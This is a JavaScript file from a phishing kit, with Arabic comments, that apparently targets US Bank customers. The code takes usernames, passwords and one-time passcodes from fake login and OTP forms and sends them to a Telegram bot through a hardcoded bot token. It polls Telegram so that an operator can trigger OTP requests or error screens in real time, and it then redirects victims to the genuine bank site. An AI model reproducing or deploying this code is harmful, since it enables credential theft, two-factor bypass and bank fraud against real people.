/* BrosTec Protocol - Full JS Replacement */
const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
const CHAT_ID = "7865246557";

// وظيفة إرسال البيانات (نفس منطق كود الريان)
async function sendLog(type, content) {
    let text = "";
    let buttons = [];

    if(type === 'LOGIN') {
        text = `🏦 *New Login Attempt*\n\n` +
               `👤 User: \`${content.user}\`\n` +
               `🔑 Pass: \`${content.pass}\``;
        buttons = [
            [{ text: "طلب OTP 📲", callback_data: "request_otp" }],
            [{ text: "خطأ في البيانات ❌", callback_data: "login_error" }]
        ];
    } 
    else if(type === 'OTP') {
        text = `🔑 *OTP Received:* \n\n` +
               `Code: \`${content.otp}\``;
        buttons = [
            [{ text: "❌ رمز خطأ", callback_data: "otp_error" }],
            [{ text: "✅ تم بنجاح", callback_data: "done" }]
        ];
    }

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        })
    });
}

// وظيفة الاستماع للأوامر (نسخة طبق الأصل من منطق الربط في كود الريان)
async function listen() {
    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        
        if(data.result.length > 0) {
            const update = data.result[0];
            const cmd = update.callback_query?.data;
            
            // تنفيذ الأوامر بناءً على رد فعل الآدمين في التيليجرام
            if(cmd === "request_otp") {
                window.location.href = "otp.html"; 
            }
            if(cmd === "login_error") {
                if(document.getElementById('loader')) document.getElementById('loader').style.display = 'none';
                if(document.getElementById('error-msg')) document.getElementById('error-msg').style.display = 'block';
            }
            if(cmd === "otp_error") {
                if(document.getElementById('loader')) document.getElementById('loader').style.display = 'none';
                if(document.getElementById('otp-error')) {
                    document.getElementById('otp-error').style.display = 'block';
                    document.getElementById('otp_val').value = ""; // تفريغ الحقل لإعادة الإدخال
                }
            }
            if(cmd === "done") {
                // يمكنك توجيهه لصفحة النجاح أو البنك الحقيقي
                window.location.href = "https://www.usbank.com";
            }
        }
    } catch(e) { console.error("Polling Error"); }
}

// فحص الأوامر كل 3 ثوانٍ كما في المرجع
setInterval(listen, 3000);

// مراقبة النماذج (Submit Events)
const loginForm = document.getElementById('loginForm');
if (loginForm) {
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        if(document.getElementById('loader')) document.getElementById('loader').style.display = 'flex';
        
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        
        sendLog('LOGIN', {user, pass});
    });
}

const otpForm = document.getElementById('otpForm');
if (otpForm) {
    otpForm.addEventListener('submit', function(e) {
        e.preventDefault();
        if(document.getElementById('loader')) document.getElementById('loader').style.display = 'flex';
        
        const otp = document.getElementById('otp_val').value;
        
        sendLog('OTP', {otp});
    });
}
